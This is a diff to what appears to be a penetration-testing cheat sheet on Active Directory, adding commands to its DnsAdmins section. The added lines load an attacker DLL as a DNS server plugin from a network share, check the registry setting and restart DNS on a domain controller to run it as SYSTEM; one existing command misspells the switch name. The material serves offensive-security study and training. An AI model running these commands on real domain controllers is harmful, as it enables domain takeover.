@@ -25,7 +25,14 @@ Get-DomainGroup -SamAccountName DnsAdmins
 
 [DNS Admins PrivEsc Guide by iRedTeam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 ```powershell
+rundll32.exe .\dnsprivesc.dll,DnsPluginInitialize
+
 dnscmd dc.pentesting.local /config /serverlevelplungindll \\student\share\privesc.dll
+
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+
+sc.exe \\dc01 stop dns
+sc.exe \\dc01 start dns
 ```
 
 ## DCSync0
